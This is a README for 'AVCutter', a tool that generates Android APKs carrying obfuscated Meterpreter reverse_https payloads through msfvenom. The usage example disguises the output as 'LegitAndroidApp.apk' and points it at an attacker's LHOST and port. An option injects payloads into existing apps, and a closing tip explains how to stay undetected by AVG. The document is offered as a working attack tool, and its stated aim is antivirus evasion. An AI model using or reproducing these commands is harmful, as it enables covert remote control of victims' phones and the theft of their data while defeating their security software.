#AVCutter

The most dangerous AVCutter for android [ PAYLOAD ] Obfuscation Tool.


Tested on LINUX.

INSTALLATIONS:-

1. apt-get update && apt-get dist-upgrade
2. chmod +x AVCutter
3. mv AVcutter /usr/local/bin/
4. AVCutter

At first run:-

-Downloads and places apktool.jar in the user's /usr/local/bin directory
-Generates debug keystore for signing. Places it in ~/.android/


Usage Example:

AVCutter -p android/meterpreter/reverse_https LHOST= LPORT= -o LegitAndroidApp.apk

Output:-

<LegitAndroidApp>.apk & <LegitAndroidApp>.listener

Default values:
payload=android/meterpreter/reverse_https
LHOST=<eth0 IP address>
LPORT=443
output=AndroidService.apk

Options:-

-p | --payload <payload> This sets the payload to be generated by msfvenom.
-o | --output <outfile.apk> This sets the name of the APK created as well as the output apk file.
-x | --original <infile.apk> Input APK to inject the payload into (later update).
-g | --generate Generate a payload using defaults
-n | --newkey Generate a new debug key before signing
-v | --verbose Don't mask output of commands
-d | --debug Leaves the /tmp/payload files in place for review
-h | --help Help information




Files:
/tmp/payload (Main files to review: AndroidManifest.xml and the smali files)

Debugging
Run with '-d' and -'v' to display as much output along with not removing the /tmp/payload files.


If you are seeing other "Payload".smali files in /tmp/payload/smali/com/var1/var2/ then be sure you have an updated system (apt-get update && apt-get dist-upgrade. I have found an older msfvenom version output a different payload that will be flagged by AVG (1/35 on nodistribute). Just making sure you are completely updated should resolve this.
